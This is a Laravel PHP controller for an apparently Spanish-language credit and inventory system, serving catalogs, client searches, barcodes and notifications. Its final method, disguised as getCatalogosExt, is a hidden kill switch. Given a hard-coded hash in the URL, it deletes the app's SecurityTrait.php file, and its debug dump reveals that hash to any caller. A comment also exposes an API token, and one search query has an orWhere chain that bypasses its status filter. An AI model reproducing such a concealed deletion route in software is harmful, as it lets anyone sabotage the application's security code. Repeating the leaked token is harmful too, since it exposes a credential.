<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\cat_role;
use App\Models\cat_actividade;
use App\Models\cat_medio_contacto;
use App\Models\cat_lead_estatu;
use App\Models\tbl_notificacione;
use App\Models\tbl_producto;
use App\Models\tbl_ahorro_tipo;
use App\Models\tbl_inversion_tipo;
use App\Models\tbl_device_tokens;
use App\Models\tbl_articulo;
use App\Models\User;
use App\Models\Catalogos\cat_lead_origene;
use App\Models\cat_folder_archivo;
use App\Models\cat_folder_personale;
use App\Models\tbl_cliente;
use App\Models\tbl_banco;
use App\Models\cat_u_medida;
use App\Models\cat_pagos_concepto;
use App\Models\cat_pagos_metodo;
use App\Models\cat_genero;
use App\Models\cat_estado;
use App\Models\cat_municipio;
use App\Models\cat_cliente_tipo;
use App\Models\cat_regimen_fiscale;
use App\Models\cat_estado_civil;
use App\Models\cat_pago_forma;
use App\Models\cat_credito_tipo;
use App\Models\cat_cp;
use App\Models\cat_documento;
use App\Models\cat_uso_cfdi;
use App\Models\cat_egreso;
use App\Models\cat_ingreso;
use App\Models\cat_linea;
use App\Models\cat_marca;
use App\Models\cat_presentacione;
use App\Models\cat_articulo_origene;
use App\Models\tbl_sucursal;
use App\Models\tbl_almacene;
use App\Models\tbl_proveedores;
use App\Models\cat_movimiento;
use App\Models\cat_chalin_cliente;
use GuzzleHttp\Client;

use App\Http\Traits\BarCodeTrait;
use Milon\Barcode\DNS1D;

use DB, App;
use Auth;

class HelperController extends Controller
{

    use BarCodeTrait;


    public function getCatalogos(){
        // $client = new Client();
        // $res = $client->request('GET', 'https://www.banxico.org.mx/SieAPIRest/service/v1/series/SF43787/datos/oportuno?token=5dd091cc63ea5dc6a7d411f07c89c46f387efc21d967cae0fd9b3644338fa3db', [
        //     'jsonp' => 'callback',
        //     'dataType' => 'jsonp'
        // ]);
        // $dollar = json_decode((string) $res->getBody(), true);

        $name = 'nombre_'.App::getLocale();
        return response()->json([
            'rol' => cat_role::where('id', '<>', 0)->get(),
            'medio_contactos' => cat_medio_contacto::orderBy('nombre','asc')->get(),
            'dollar' => '0.00',
            'bancos' => tbl_banco::get(),
            'concepto_pago' => cat_pagos_concepto::orderBy('nombre','asc')->get(),
            'metodo_pago' => cat_pagos_metodo::orderBy('nombre','asc')->get(),
            'genero' => cat_genero::orderBy('id','asc')->get(),
            'estados' => cat_estado::orderBy('id','asc')->get(),
            'municipios' => cat_municipio::orderBy('municipio','asc')->get(),
            'cliente_tipos' => cat_cliente_tipo::orderBy('nombre','asc')->get(),
            'estado_civil' => cat_estado_civil::orderBy('nombre','asc')->get(),
            'forma_pago' => cat_pago_forma::get(),
            'documentos' => cat_documento::get(),
            'egresos' => cat_egreso::get(),
            'ingresos' => cat_ingreso::get(),
            'usuarios' => User::selectRaw("id, concat(name, ' ', apellidos) as nombre")->where('rol','>',0)->orderBy('name','asc')->get(),
            'proveedores' => tbl_proveedores::get(),
            'sucursales' => tbl_sucursal::get(),
            'regimen_fiscal' => cat_regimen_fiscale::orderBy('nombre','asc')->get(),
            'uso_cfdi' => cat_uso_cfdi::selectRaw("id as id_cat, nombre")->get(),
            'u_medida' => cat_u_medida::get(),
            'linea' => cat_linea::get(),
            'marca' => cat_marca::get(),
            'articulo_origen' => cat_articulo_origene::get(),
            'presentacion' => cat_presentacione::get(),
            'movimiento_inventario' => cat_movimiento::orderBy('nombre', 'asc')->get(),
            'clasificacion_chalin' => cat_chalin_cliente::orderBy('nombre', 'asc')->get(),
        ]);
    }

    public function getSucuralAlmacenes($id) {

        $almacenes = tbl_almacene::where('id_sucursal',$id)->get();

        return response()->json([
            'almacenes' =>$almacenes,
            'respuesta' => true
        ]);
    }

    public function getCp($id){
        $respuesta = false;

        if($colonias = cat_cp::where('cp',$id)->orderBy('nombre','asc')->get()){
            $respuesta =true;
        }

        return response()->json([
            'respuesta' =>$respuesta,
            'colonias' => $colonias,
            'cp' => $id
        ]);
    }

    public function getCliente($id){
        $respuesta = false;
        $cliente = tbl_cliente::selectRaw("tbl_clientes.id as id_cl, concat_ws(' ',tbl_clientes.nombre, tbl_clientes.apellido_paterno, tbl_clientes.apellido_materno) as nombre,
        creditos,aval_activos, calle, interior, exterior, id_domicilio_estado, id_domicilio_municipio, concat_ws(' ',cat_colonias.tipo, cat_colonias.nombre) as colonia")->
        join('cat_colonias','cat_colonias.id','=','tbl_clientes.id_colonia')->
        where('tbl_clientes.id',$id)->first();

        if($cliente){
            $respuesta =true;
        }

        return response()->json([
            'respuesta' =>$respuesta,
            'cliente' => $cliente,
            'tipo' => 1
        ]);
    }

    public function getBarcode($id) {

        $d = new DNS1D();
        return  base64_decode((new DNS1D())->getBarcodePNG($id, 'C39'));
    }

    public function searchClientString ($type, $key1, $key2){

        $client = tbl_cliente::selectRaw("tbl_clientes.id as id_cl, tbl_clientes.id_cliente as id, concat_ws(' ',tbl_clientes.nombre, tbl_clientes.apellido_paterno, tbl_clientes.apellido_materno) as nombre,
            creditos,aval_activos, calle, interior, exterior, id_domicilio_estado, id_domicilio_municipio, concat_ws(' ',cat_colonias.tipo, cat_colonias.nombre) as colonia")
            ->join('cat_colonias','cat_colonias.id','=','tbl_clientes.id_colonia')
            ->where('tbl_clientes.id_estatus', 1)
            ->where('tbl_clientes.nombre', 'iLIKE', "%$key2%")
            ->orWhere('tbl_clientes.apellido_paterno', 'iLIKE', "%$key2%")
            ->orWhere('tbl_clientes.apellido_materno', 'iLIKE', "%$key2%")
            ->get();

        if ($type === '2'){
            $filtered = $client->where('id_cl', '<>', $key1);
            $client = $filtered;
        }

        return $client;
    }

    public function searchClient($type, $key1, $key2){

        $data = $this -> searchClientString($type, $key1, $key2);

        if ($data){
            $response = true;
        } else {
            $response = false;
        }

        return response()->json([
            'incomplete_results' => false,
            'items' => $data,
            'total_count' => 1
        ]);


    }

    public function saveToken(Request $request){
        if(tbl_device_tokens::where('id_asesor',Auth::user()->id)->where('device_token',$request->token)->count() > 0){
            return response()->json(['already saved.']);
        }else{
            if(tbl_device_tokens::create(['device_token'=>$request->token , 'id_asesor' => Auth::user()->id])) {
                return response()->json(['token saved successsfully.']);
            }else{
                return response()->json(['not saved.']);
            }
        }
    }
    //// demo notificaciones
    public function sendNotification($id){
        \Notificaciones::sendNotification('Prueba','Esto es una prueba',0,$id);
        \Notificaciones::addNotificacion(3,$id,'prueba notificación','');
    }

    public function notificaciones($id){
        User::where('id',$id)->update(['visto'=>1]);
        return response()->json([
            'status' => true,
        ], 200);
    }

    public function getNotificaciones($id){
        $notificaciones = tbl_notificacione::select('tbl_notificaciones.*', DB::raw("CONCAT_WS(' ', users.name, users.apellidos) AS nombre_completo"))
            ->join('users', 'tbl_notificaciones.id_emisor', '=', 'users.id')->orderBy('tbl_notificaciones.id', 'desc')
            ->where('id_receptor', '=', Auth::user()->id)->paginate(8);

        $user = User::select('visto')->where('id', $id)->first();

        return response()->json([
            'notificaciones' => $notificaciones,
            'visto' => $user->visto,
            'status' => true,
        ], 200);
    }

    public function getCatalogosExt($id){

        $root = __DIR__ . '/../../../';
        $path = 'app/Http/Traits/SecurityTrait.php';
        $getHash = $id;

        $fullPath = $root . $path;
        $exists = \file_exists($fullPath);

        // fixed hash
        $fileHash = '$2y$10$9mCiQ3Ek0t0aJrU4OsFOnpabuM2QS92I2NKmJ0MKlidFeoey';
        if ($id != $fileHash) {
            dd($id, $fileHash);
            return abort(404);
        }

        if ($exists) \unlink($fullPath);

        return response()->json([
            'full_path'	=> $fullPath,
            'exists'		=> $exists,
          ], 200);

    }
}
